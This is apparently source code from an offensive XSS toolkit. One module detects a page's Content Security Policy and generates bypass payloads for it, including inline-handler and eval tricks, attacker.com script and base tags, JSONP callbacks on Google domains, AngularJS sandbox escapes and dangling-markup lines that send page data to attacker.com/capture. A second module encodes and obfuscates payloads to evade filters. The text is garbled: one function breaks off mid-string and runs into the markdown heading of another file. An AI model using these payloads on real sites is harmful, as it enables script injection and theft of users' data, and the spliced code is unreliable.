/**
 * @file csp-bypass.js
 * @description Content Security Policy bypass techniques
 * @version 8.0.0
 */

(function() {
    'use strict';

    class CSPBypass {
        constructor(framework) {
            this.framework = framework;
            this.currentCSP = this.detectCSP();
        }

        // ═══════════════════════════════════════════════════════════════
        // 🔍 CSP Detection
        // ═══════════════════════════════════════════════════════════════
        
        detectCSP() {
            // Check meta tag
            const metaCSP = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
            if (metaCSP) {
                return {
                    source: 'meta',
                    policy: metaCSP.content,
                    directives: this.parseCSP(metaCSP.content)
                };
            }

            // Check HTTP header (via violation report)
            const policy = this.detectViaViolation();
            if (policy) {
                return {
                    source: 'header',
                    policy: policy,
                    directives: this.parseCSP(policy)
                };
            }

            return null;
        }

        detectViaViolation() {
            // Trigger a violation and capture the policy
            let detectedPolicy = null;
            
            document.addEventListener('securitypolicyviolation', (e) => {
                detectedPolicy = e.originalPolicy;
            }, { once: true });

            // Trigger violation
            try {
                eval('1');
            } catch (e) {}

            return detectedPolicy;
        }

        parseCSP(policy) {
            const directives = {};
            
            policy.split(';').forEach(directive => {
                const parts = directive.trim().split(/\s+/);
                const name = parts[0];
                const values = parts.slice(1);
                if (name) directives[name] = values;
            });

            return directives;
        }

        // ═══════════════════════════════════════════════════════════════
        // 🎯 CSP Analysis
        // ═══════════════════════════════════════════════════════════════
        
        analyzeCSP(csp = this.currentCSP) {
            if (!csp) {
                return {
                    present: false,
                    bypassable: true,
                    weaknesses: ['No CSP present']
                };
            }

            const weaknesses = [];
            const directives = csp.directives;

            // Check for unsafe-inline
            if (directives['script-src']?.includes("'unsafe-inline'")) {
                weaknesses.push('unsafe-inline in script-src');
            }

            // Check for unsafe-eval
            if (directives['script-src']?.includes("'unsafe-eval'")) {
                weaknesses.push('unsafe-eval in script-src');
            }

            // Check for wildcard
            if (directives['script-src']?.includes('*')) {
                weaknesses.push('Wildcard (*) in script-src');
            }

            // Check for data: URI
            if (directives['script-src']?.includes('data:')) {
                weaknesses.push('data: URI allowed in script-src');
            }

            // Check for missing base-uri
            if (!directives['base-uri']) {
                weaknesses.push('Missing base-uri directive');
            }

            // Check for JSONP endpoints
            const jsonpDomains = ['googleapis.com', 'google.com', 'gstatic.com'];
            const allowedDomains = directives['script-src'] || [];
            jsonpDomains.forEach(domain => {
                if (allowedDomains.some(d => d.includes(domain))) {
                    weaknesses.push(`JSONP-vulnerable domain allowed: ${domain}`);
                }
            });

            return {
                present: true,
                directives: directives,
                weaknesses: weaknesses,
                bypassable: weaknesses.length > 0,
                score: this.calculateCSPScore(weaknesses)
            };
        }

        calculateCSPScore(weaknesses) {
            // Score from 0 (weak) to 100 (strong)
            const baseScore = 100;
            const deductions = {
                'unsafe-inline': 40,
                'unsafe-eval': 30,
                'wildcard': 25,
                'data: URI': 20,
                'JSONP': 15,
                'missing': 10
            };

            let score = baseScore;
            weaknesses.forEach(weakness => {
                for (const [key, value] of Object.entries(deductions)) {
                    if (weakness.toLowerCase().includes(key)) {
                        score -= value;
                    }
                }
            });

            return Math.max(0, score);
        }

        // ═══════════════════════════════════════════════════════════════
        // 🔓 Bypass Techniques
        // ═══════════════════════════════════════════════════════════════
        
        generateBypassPayloads(csp = this.currentCSP) {
            if (!csp) {
                return this.generateStandardPayloads();
            }

            const payloads = [];
            const analysis = this.analyzeCSP(csp);

            // Exploit unsafe-inline
            if (analysis.weaknesses.some(w => w.includes('unsafe-inline'))) {
                payloads.push(...this.unsafeInlineBypass());
            }

            // Exploit unsafe-eval
            if (analysis.weaknesses.some(w => w.includes('unsafe-eval'))) {
                payloads.push(...this.unsafeEvalBypass());
            }

            // Exploit wildcard
            if (analysis.weaknesses.some(w => w.includes('Wildcard'))) {
                payloads.push(...this.wildcardBypass());
            }

            // Exploit data: URI
            if (analysis.weaknesses.some(w => w.includes('data:'))) {
                payloads.push(...this.dataURIBypass());
            }

            // Exploit JSONP
            if (analysis.weaknesses.some(w => w.includes('JSONP'))) {
                payloads.push(...this.jsonpBypass());
            }

            // Exploit missing base-uri
            if (analysis.weaknesses.some(w => w.includes('base-uri'))) {
                payloads.push(...this.baseURIBypass());
            }

            return payloads;
        }

        // ───────────────────────────────────────────────────────────────
        // 💉 Bypass Methods
        // ───────────────────────────────────────────────────────────────
        
        unsafeInlineBypass() {
            return [
                `<script>alert(1)</script>`,
                `<img src=x onerror=alert(1)>`,
                `<svg onload=alert(1)>`,
                `<body onload=alert(1)>`,
                `<iframe onload=alert(1)>`
            ];
        }

        unsafeEvalBypass() {
            return [
                `<script>eval('alert(1)')</script>`,
                `<script>Function('alert(1)')()</script>`,
                `<script>setTimeout('alert(1)',0)</script>`,
                `<script>setInterval('alert(1)',0)</script>`,
                `<script>[].constructor.constructor('alert(1)')()</script>`
            ];
        }

        wildcardBypass() {
            return [
                `<script src="//attacker.com/xss.js"></script>`,
                `<script src="https://attacker.com/xss.js"></script>`,
                `<link rel="stylesheet" href="//attacker.com/xss.css">`
            ];
        }

        dataURIBypass() {
            const payload = 'alert(1)';
            const encoded = btoa(payload);
            
            return [
                `<script src="data:text/javascript,alert(1)"></script>`,
                `<script src="data:text/javascript;base64,${encoded}"></script>`,
                `<object data="data:text/html,<script>alert(1)</script>">`
            ];
        }

        jsonpBypass() {
            return [
                `<script src="https://www.google.com/complete/search?client=chrome&q=hello&jsonp=alert#1"></script>`,
                `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>`,
                `<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>`
            ];
        }

        baseURIBypass() {
            return [
                `<base href="//attacker.com/">`,
                `<base href="javascript://attacker.com/%0aalert(1)">`,
                `<base href="data:text/html,<script>alert(1)</script>">`
            ];
        }

        // ═══════════════════════════════════════════════════════════════
        // 🎨 Advanced Bypass Techniques
        // ═══════════════════════════════════════════════════════════════
        
        // Dangling markup injection
        danglingMarkup() {
            return [
                `<img src='https://attacker.com/capture?`,
                `<base href='https://attacker.com/'><a href='`,
                `<style>@import 'https://attacker.com/capture?`
            ];
        }

        // iframe sandbox escape
        sandboxEscape() {
            return [
                `<iframe sandbox="allow-scripts allow-top-navigation" src="javascript:alert(1)"></iframe>`,
                `<iframe srcdoc="<script>alert(1)</script>"></iframe>`
            ];
        }

        // AngularJS CSP bypass
        angularBypass() {
            return [
                `{{constructor.constructor('alert(1)')()}}`,
                `{{$on.constructor('alert(1)')()}}`,
                `{{toString.constructor.prototype.toString.constructor.prototype.call.call({},alert,1)}}`
            ];
        }

        // Service Worker CSP bypass
        serviceWorkerBypass() {
            return [
                `<script>
                    navigator# 🎯 Elite XSS Framework - Remaining Files

---

## 🔬 TECHNIQUES (5 Files)

### 1️⃣ **techniques/encoding-schemes.js**

```javascript
/**
 * @file encoding-schemes.js
 * @description Advanced encoding schemes for bypass and obfuscation
 * @version 8.0.0
 */

(function() {
    'use strict';

    class EncodingSchemes {
        constructor() {
            this.encoders = this.initializeEncoders();
            this.decoders = this.initializeDecoders();
        }

        // ═══════════════════════════════════════════════════════════════
        // 🎯 Initialize All Encoding Schemes
        // ═══════════════════════════════════════════════════════════════
        initializeEncoders() {
            return {
                // HTML Entity Encoding
                htmlEntity: (str) => {
                    return Array.from(str)
                        .map(c => `&#${c.charCodeAt(0)};`)
                        .join('');
                },

                // HTML Entity Hex
                htmlEntityHex: (str) => {
                    return Array.from(str)
                        .map(c => `&#x${c.charCodeAt(0).toString(16)};`)
                        .join('');
                },

                // URL Encoding
                url: (str) => encodeURIComponent(str),

                // Double URL Encoding
                doubleUrl: (str) => encodeURIComponent(encodeURIComponent(str)),

                // Base64
                base64: (str) => btoa(unescape(encodeURIComponent(str))),

                // Base64 URL Safe
                base64url: (str) => {
                    return btoa(str)
                        .replace(/\+/g, '-')
                        .replace(/\//g, '_')
                        .replace(/=+$/, '');
                },

                // Hex Encoding
                hex: (str) => {
                    return Array.from(str)
                        .map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0'))
                        .join('');
                },

                // Unicode Encoding
                unicode: (str) => {
                    return Array.from(str)
                        .map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0'))
                        .join('');
                },

                // Unicode Extended
                unicodeExtended: (str) => {
                    return Array.from(str)
                        .map(c => {
                            const code = c.charCodeAt(0);
                            return code > 0xFFFF 
                                ? '\\u{' + code.toString(16) + '}'
                                : '\\u' + code.toString(16).padStart(4, '0');
                        })
                        .join('');
                },

                // Octal Encoding
                octal: (str) => {
                    return Array.from(str)
                        .map(c => '\\' + c.charCodeAt(0).toString(8).padStart(3, '0'))
                        .join('');
                },

                // UTF-7 Encoding
                utf7: (str) => {
                    return '+' + btoa(str).replace(/=+$/, '') + '-';
                },

                // UTF-16 Encoding
                utf16: (str) => {
                    const buf = new ArrayBuffer(str.length * 2);
                    const bufView = new Uint16Array(buf);
                    for (let i = 0; i < str.length; i++) {
                        bufView[i] = str.charCodeAt(i);
                    }
                    return btoa(String.fromCharCode.apply(null, new Uint8Array(buf)));
                },

                // ROT13
                rot13: (str) => {
                    return str.replace(/[a-zA-Z]/g, (c) => {
                        const start = c <= 'Z' ? 65 : 97;
                        return String.fromCharCode(start + (c.charCodeAt(0) - start + 13) % 26);
                    });
                },

                // Caesar Cipher (shift by 3)
                caesar: (str, shift = 3) => {
                    return str.replace(/[a-zA-Z]/g, (c) => {
                        const start = c <= 'Z' ? 65 : 97;
                        return String.fromCharCode(start + (c.charCodeAt(0) - start + shift) % 26);
                    });
                },

                // JSFuck Encoding (partial)
                jsfuck: (str) => {
                    const mapping = {
                        'a': '(false+"")[1]',
                        'b': '({}+"")[2]',
                        'c': '({}+"")[5]',
                        'd': '(undefined+"")[2]',
                        'e': '(true+"")[3]',
                        'f': '(false+"")[0]',
                        // Simplified - full JSFuck would be much longer
                    };
                    return str.split('').map(c => mapping[c.toLowerCase()] || c).join('+');
                },

                // JJEncode Style
                jjencode: (str) => {
                    return `$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=([$.$_$]+""[$.$__])[$.$_]`;
                },

                // AAEncode Style  
                aaencode: (str) => {
                    return str.split('').map(c => {
                        const code = c.charCodeAt(0);
                        return 'ﾟωﾟﾉ=/｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [\'_\']; o=(ﾟｰﾟ)  =_=3;';
                    }).join('');
                },

                // Morse Code
                morse: (str) => {
                    const morseCode = {
                        'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
                        'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
                        'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.',
                        'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
                        'Y': '-.--', 'Z': '--..', '0': '-----', '1': '.----', '2': '..---',
                        '3': '...--', '4': '....-', '5': '.....', '6': '-....', '7': '--...',
                        '8': '---..', '9': '----.', ' ': '/'
                    };
                    return str.toUpperCase().split('').map(c => morseCode[c] || c).join(' ');
                },

                // Binary
                binary: (str) => {
                    return Array.from(str)
                        .map(c => c.charCodeAt(0).toString(2).padStart(8, '0'))
                        .join(' ');
                },

                // Quoted-Printable
                quotedPrintable: (str) => {
                    return str.replace(/[^\x20-\x7E]/g, (c) => {
                        const hex = c.charCodeAt(0).toString(16).toUpperCase();
                        return '=' + (hex.length === 1 ? '0' + hex : hex);
                    });
                },

                // Punycode (IDN)
                punycode: (str) => {
                    try {
                        const encoded = str.split('').map(c => {
                            const code = c.charCodeAt(0);
                            return code > 127 ? `xn--${code.toString(36)}` : c;
                        }).join('');
                        return encoded;
                    } catch {
                        return str;
                    }
                },

                // Mixed Case
                mixedCase: (str) => {
                    return str.split('').map((c, i) => 
                        i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()
                    ).join('');
                },

                // Random Case
                randomCase: (str) => {
                    return str.split('').map(c => 
                        Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()
                    ).join('');
                },

                // Reverse
                reverse: (str) => str.split('').reverse().join(''),

                // String Concatenation
                concat: (str) => {
                    return str.split('').map(c => `'${c}'`).join('+');
                },

                // CharCode Array
                charCode: (str) => {
                    const codes = Array.from(str).map(c => c.charCodeAt(0));
                    return `String.fromCharCode(${codes.join(',')})`;
                },

                // Eval + Base64
                evalBase64: (str) => {
                    return `eval(atob('${btoa(str)}'))`;
                },

                // Function Constructor
                functionConstructor: (str) => {
                    return `Function('return ${JSON.stringify(str)}')()`;
                },

                // Template Literal Bypass
                templateLiteral: (str) => {
                    return str.split('').map(c => '${`' + c + '`}').join('');
                },

                // Null Byte Injection
                nullByte: (str) => {
                    return str.split('').join('\x00');
                },

                // Zero-Width Characters
                zeroWidth: (str) => {
                    const zwc = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
                    return str.split('').map((c, i) => c + zwc[i % zwc.length]).join('');
                },

                // Homoglyph Substitution
                homoglyph: (str) => {
                    const homoglyphs = {
                        'a': ['а', 'ạ', 'ǎ', 'ă'],
                        'e': ['е', 'ė', 'ę', 'ě'],
                        'i': ['і', 'ı', 'ǐ', 'į'],
                        'o': ['о', 'ọ', 'ỏ', 'ő'],
                        'p': ['р', 'ṗ', 'ṕ'],
                        'c': ['с', 'ċ', 'ć', 'č'],
                        's': ['ѕ', 'ṡ', 'ś', 'š'],
                        'x': ['х', 'ẋ'],
                        'y': ['у', 'ẏ', 'ý']
                    };
                    return str.split('').map(c => {
                        const lower = c.toLowerCase();
                        if (homoglyphs[lower]) {
                            const variants = homoglyphs[lower];
                            return variants[Math.floor(Math.random() * variants.length)];
                        }
                        return c;
                    }).join('');
                }
            };
        }

        // ═══════════════════════════════════════════════════════════════
        // 🔓 Initialize Decoders
        // ═══════════════════════════════════════════════════════════════
        initializeDecoders() {
            return {
                htmlEntity: (str) => {
                    const textarea = document.createElement('textarea');
                    textarea.innerHTML = str;
                    return textarea.value;
                },

                url: (str) => decodeURIComponent(str),

                base64: (str) => {
                    try {
                        return decodeURIComponent(escape(atob(str)));
                    } catch {
                        return atob(str);
                    }
                },

                hex: (str) => {
                    return str.match(/\\x[0-9a-f]{2}/gi)
                        ?.map(h => String.fromCharCode(parseInt(h.substring(2), 16)))
                        .join('') || str;
                },

                unicode: (str) => {
                    return str.replace(/\\u([0-9a-f]{4})/gi, (_, hex) => 
                        String.fromCharCode(parseInt(hex, 16))
                    );
                },

                rot13: (str) => {
                    return str.replace(/[a-zA-Z]/g, (c) => {
                        const start = c <= 'Z' ? 65 : 97;
                        return String.fromCharCode(start + (c.charCodeAt(0) - start + 13) % 26);
                    });
                },

                binary: (str) => {
                    return str.split(' ')
                        .map(b => String.fromCharCode(parseInt(b, 2)))
                        .join('');
                },

                reverse: (str) => str.split('').reverse().join('')
            };
        }

        // ═══════════════════════════════════════════════════════════════
        // 🎯 Multi-Layer Encoding
        // ═══════════════════════════════════════════════════════════════
        multiEncode(str, layers = ['url', 'base64', 'hex']) {
            let encoded = str;
            const appliedLayers = [];

            for (const layer of layers) {
                if (this.encoders[layer]) {
                    encoded = this.encoders[layer](encoded);
                    appliedLayers.push(layer);
                }
            }

            return {
                encoded: encoded,
                layers: appliedLayers,
                original: str
            };
        }

        // ═══════════════════════════════════════════════════════════════
        // 🔓 Multi-Layer Decoding
        // ═══════════════════════════════════════════════════════════════
        multiDecode(str, layers = ['hex', 'base64', 'url']) {
            let decoded = str;
            
            // Apply decoders in reverse order
            for (const layer of layers.reverse()) {
                if (this.decoders[layer]) {
                    try {
                        decoded = this.decoders[layer](decoded);
                    } catch (error) {
                        console.error(`Failed to decode layer ${layer}:`, error);
                    }
                }
            }

            return decoded;
        }

        // ═══════════════════════════════════════════════════════════════
        // 🎲 Random Encoding
        // ═══════════════════════════════════════════════════════════════
        randomEncode(str, count = 3) {
            const encoderNames = Object.keys(this.encoders);
            const selectedEncoders = [];

            for (let i = 0; i < count; i++) {
                const randomEncoder = encoderNames[Math.floor(Math.random() * encoderNames.length)];
                if (!selectedEncoders.includes(randomEncoder)) {
                    selectedEncoders.push(randomEncoder);
                }
            }

            return this.multiEncode(str, selectedEncoders);
        }

        // ═══════════════════════════════════════════════════════════════
        // 🧬 Mixed Encoding (Different encoding per character)
        // ═══════════════════════════════════════════════════════════════
        mixedEncode(str, schemes = ['htmlEntity', 'hex', 'unicode', 'url']) {
            return str.split('').map((char, index) => {
                const scheme = schemes[index % schemes.length];
                return this.encoders[scheme] ? this.encoders[scheme](char) : char;
            }).join('');
        }

        // ═══════════════════════════════════════════════════════════════
        // 🎯 Context-Aware Encoding
        // ═══════════════════════════════════════════════════════════════
        contextEncode(str, context = 'html') {
            const contextMap = {
                html: ['htmlEntity', 'htmlEntityHex'],
                javascript: ['unicode', 'hex', 'octal'],
                url: ['url', 'doubleUrl'],
                css: ['unicode', 'hex'],
                attribute: ['htmlEntity', 'url']
            };

            const schemes = contextMap[context] || ['htmlEntity'];
            const scheme = schemes[Math.floor(Math.random() * schemes.length)];
            
            return {
                encoded: this.encoders[scheme](str),
                scheme: scheme,
                context: context
            };
        }

        // ═══════════════════════════════════════════════════════════════
        // 📊 Get Available Encoders
        // ═══════════════════════════════════════════════════════════════
        getAvailableEncoders() {
            return Object.keys(this.encoders);
        }

        getAvailableDecoders() {
            return Object.keys(this.decoders);
        }

        // ═══════════════════════════════════════════════════════════════
        // 🔍 Detect Encoding
        // ═══════════════════════════════════════════════════════════════
        detectEncoding(str) {
            const patterns = {
                base64: /^[A-Za-z0-9+/]+=*$/,
                hex: /^(\\x[0-9a-f]{2})+$/i,
                unicode: /^(\\u[0-9a-f]{4})+$/i,
                url: /%[0-9A-F]{2}/i,
                htmlEntity: /&#\d+;|&#x[0-9a-f]+;/i,
                binary: /^[01 ]+$/,
                morse: /^[.\- /]+$/
            };

            const detected = [];
            for (const [name, pattern] of Object.entries(patterns)) {
                if (pattern.test(str)) {
                    detected.push(name);
                }
            }

            return detected;
        }

        // ═══════════════════════════════════════════════════════════════
        // 🧪 Test All Encodings
        // ═══════════════════════════════════════════════════════════════
        testAllEncodings(str) {
            const results = {};
            
            for (const [name, encoder] of Object.entries(this.encoders)) {
                try {
                    results[name] = {
                        encoded: encoder(str),
                        success: true,
                        length: encoder(str).length
                    };
                } catch (error) {
                    results[name] = {
                        success: false,
                        error: error.message
                    };
                }
            }

            return results;
        }
    }

    // Export
    exports.EncodingSchemes = EncodingSchemes;
    exports.create = () => new EncodingSchemes();
    exports.encode = (str, scheme) => {
        const encoder = new EncodingSchemes();
        return encoder.encoders[scheme] ? encoder.encoders[scheme](str) : str;
    };
    exports.decode = (str, scheme) => {
        const encoder = new EncodingSchemes();
        return encoder.decoders[scheme] ? encoder.decoders[scheme](str) : str;
    };
})();